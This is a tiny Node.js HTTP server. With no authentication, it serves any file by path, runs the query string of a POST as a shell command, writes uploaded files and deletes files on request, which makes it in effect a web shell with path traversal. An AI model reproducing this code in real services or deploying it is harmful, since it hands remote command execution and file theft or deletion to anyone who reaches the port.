var fs = require('fs')
var exec = require('child_process').exec
var http = require('http')
http.createServer((request,response) => ({
    'GET': () => fs.createReadStream('.' + request.url, 'utf8')
                   .on('error', err => response.end(JSON.stringify(err)))
                   .pipe(response),
    'POST': () => exec(decodeURI(request.url.split('?')[1])).stdio.forEach(stdio => stdio.pipe(response)),
    'PUT': () => request.pipe(fs.createWriteStream('.' + request.url, 'utf8'))
                        .on('finish', () => response.end()),
    'DELETE': () => fs.unlink('.' + request.url, err => response.end( err ? JSON.stringify(err) : 'OK'))
})[request.method]()).listen(3000)